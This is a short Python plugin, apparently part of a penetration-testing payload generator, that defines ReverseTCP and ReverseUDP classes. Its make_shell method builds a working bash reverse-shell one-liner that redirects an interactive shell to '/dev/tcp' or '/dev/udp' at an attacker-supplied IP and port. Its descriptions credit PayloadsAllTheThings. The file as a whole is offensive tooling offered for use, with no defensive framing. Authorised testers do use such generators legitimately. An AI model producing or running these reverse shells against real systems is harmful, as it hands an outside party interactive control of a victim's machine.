from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.extension = "sh"
        self.set_write_file()
        self.opts.description = "[ReverseShell][TCP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = f"{self.args.shell} -i >& /dev/"
        if self.is_udp:
            self.shell += "udp"
        else:
            self.shell += "tcp"
        self.shell += f"/{self.args.ip}/{self.args.port} 0>&1"


class ReverseUDP(ReverseTCP):
    def __init__(self):
        super().__init__()
        self.is_udp = True
        self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
